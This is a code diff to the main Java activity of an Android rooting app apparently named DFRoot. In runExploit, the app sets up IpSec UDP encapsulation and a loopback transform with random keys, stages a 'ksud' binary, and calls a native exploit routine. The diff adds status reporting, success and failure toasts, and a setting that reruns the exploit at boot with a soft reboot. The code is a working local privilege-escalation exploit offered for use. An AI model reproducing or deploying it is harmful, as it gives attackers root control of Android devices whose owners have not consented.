@@ -11,6 +11,7 @@ import android.os.Handler;
 import android.os.Looper;
 import android.util.Log;
 import android.view.View;
+import android.widget.Toast;
 
 import androidx.appcompat.app.AppCompatActivity;
 
@@ -38,6 +39,7 @@ public class MainActivity extends AppCompatActivity implements IReporter {
     private final Executor mExec = Executors.newSingleThreadExecutor();
 
     public void report(String msg) {
+        Log.i(TAG, msg.trim());
         mMain.post(() -> {
             binding.outputView.append(msg);
             binding.outputScroll.post(() -> binding.outputScroll.fullScroll(View.FOCUS_DOWN));
@@ -46,7 +48,7 @@ public class MainActivity extends AppCompatActivity implements IReporter {
 
     static native int nativeRunAll(IReporter reporter, int encapPort, int spi,
                                     byte[] aesCbcKey, byte[] hmacKey, int icvLen,
-                                    int senderPort, String ksudPath, boolean skipSoftReboot);
+                                    int senderPort, String ksudPath, boolean softReboot);
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -65,27 +67,41 @@ public class MainActivity extends AppCompatActivity implements IReporter {
 
         ComponentName bootReceiver = new ComponentName(this, BootReceiver.class);
         int state = getPackageManager().getComponentEnabledSetting(bootReceiver);
-        binding.switchBootStart.setChecked(state == PackageManager.COMPONENT_ENABLED_STATE_ENABLED);
-        binding.switchBootStart.setOnCheckedChangeListener((btn, checked) ->
+        boolean bootEnabled = state == PackageManager.COMPONENT_ENABLED_STATE_ENABLED;
+        binding.switchBootStart.setChecked(bootEnabled);
+        binding.switchBootStart.setOnCheckedChangeListener((btn, checked) -> {
             getPackageManager().setComponentEnabledSetting(bootReceiver,
                 checked ? PackageManager.COMPONENT_ENABLED_STATE_ENABLED
                         : PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                PackageManager.DONT_KILL_APP));
+                PackageManager.DONT_KILL_APP);
+            binding.switchAutoSoftReboot.setEnabled(checked);
+        });
+
+        boolean autoSoftReboot = createDeviceProtectedStorageContext()
+                .getSharedPreferences("dfroot", MODE_PRIVATE)
+                .getBoolean("auto_soft_reboot", true);
+        binding.switchAutoSoftReboot.setChecked(autoSoftReboot);
+        binding.switchAutoSoftReboot.setEnabled(bootEnabled);
+        binding.switchAutoSoftReboot.setOnCheckedChangeListener((btn, checked) ->
+            createDeviceProtectedStorageContext()
+                .getSharedPreferences("dfroot", MODE_PRIVATE)
+                .edit().putBoolean("auto_soft_reboot", checked).apply());
     }
 
     private void runExploit() {
         try {
+            report("=== setup ===\n");
             IpSecManager ipsec = (IpSecManager) getSystemService(IPSEC_SERVICE);
 
             IpSecManager.UdpEncapsulationSocket encapSock = ipsec.openUdpEncapsulationSocket();
             int encapPort = encapSock.getPort();
-            log("encap port: " + encapPort);
+            report("encap port: " + encapPort + "\n");
 
             InetAddress loopback = InetAddress.getByName("127.0.0.1");
             IpSecManager.SecurityParameterIndex spiObj =
                     ipsec.allocateSecurityParameterIndex(loopback);
             int spiVal = spiObj.getSpi();
-            log("spi: 0x" + Integer.toHexString(spiVal));
+            report("spi: 0x" + Integer.toHexString(spiVal) + "\n");
 
             SecureRandom rng = new SecureRandom();
             byte[] aesKey  = new byte[32]; rng.nextBytes(aesKey);
@@ -105,12 +121,18 @@ public class MainActivity extends AppCompatActivity implements IReporter {
                     .buildTransportModeTransform(loopback, spiObj);
 
             stageAsset(this, "ksud", true, getFilesDir());
-            log("ksud staged to: " + new File(getFilesDir(), "ksud").getAbsolutePath());
-            log("running native exploit...");
+            report("ksud staged to: " + new File(getFilesDir(), "ksud").getAbsolutePath() + "\n");
 
+            report("\n");
+            report("=== exploit ===\n");
             int icvLen = 128 / 8;
             String ksudPath = new File(getFilesDir(), "ksud").getAbsolutePath();
-            int rc = nativeRunAll(this, encapPort, spiVal, aesKey, hmacKey, icvLen, senderPort, ksudPath, true);
+            int rc = nativeRunAll(this, encapPort, spiVal, aesKey, hmacKey, icvLen, senderPort, ksudPath, false);
+            final String toastMsg = rc == 0 ? "DFRoot: SUCCESS"
+                    : rc == 1 ? "DFRoot FAILED: ksud exited with error"
+                    : rc == 2 ? "DFRoot FAILED: check logs"
+                    : "DFRoot FAILED: failed to patch files";
+            mMain.post(() -> Toast.makeText(this, toastMsg, Toast.LENGTH_LONG).show());
 
             transform.close();
             spiObj.close();
@@ -118,7 +140,7 @@ public class MainActivity extends AppCompatActivity implements IReporter {
 
         } catch (Exception e) {
             Log.e(TAG, "exploit exception", e);
-            log("\nexception: " + e);
+            report("\nexception: " + e + "\n");
         } finally {
             mMain.post(() -> {
                 binding.btnRun.setEnabled(true);
@@ -139,8 +161,4 @@ public class MainActivity extends AppCompatActivity implements IReporter {
         if (executable) dest.setExecutable(true, false);
     }
 
-    private void log(String msg) {
-        Log.i(TAG, msg);
-        report(msg + "\n");
-    }
 }
